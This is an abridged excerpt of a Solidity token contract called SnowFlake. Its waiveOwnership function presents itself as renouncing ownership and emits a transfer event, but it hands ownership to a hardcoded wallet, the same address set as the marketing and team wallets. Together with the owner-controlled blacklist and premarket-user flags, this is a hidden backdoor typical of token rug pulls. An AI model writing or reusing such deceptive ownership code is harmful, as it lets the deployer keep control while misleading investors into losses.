...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xa8FcC5798b6b442508d5ef7328F08f7AE194336F));
        _owner = address(0xa8FcC5798b6b442508d5ef7328F08f7AE194336F);
    }
...
contract SnowFlake is Context, IERC20, Ownable {
    ...
    string private _name = "SnowFlake";
    string private _symbol = "SNOWF";
    uint8 private _decimals = 9;
    bool public market_active;
    mapping (address => bool) public _isBlacklisted;
    mapping (address => bool) public premarket_user;

    address payable public marketingWalletAddress = payable(0xa8FcC5798b6b442508d5ef7328F08f7AE194336F);
    address payable public teamWalletAddress = payable(0xa8FcC5798b6b442508d5ef7328F08f7AE194336F);
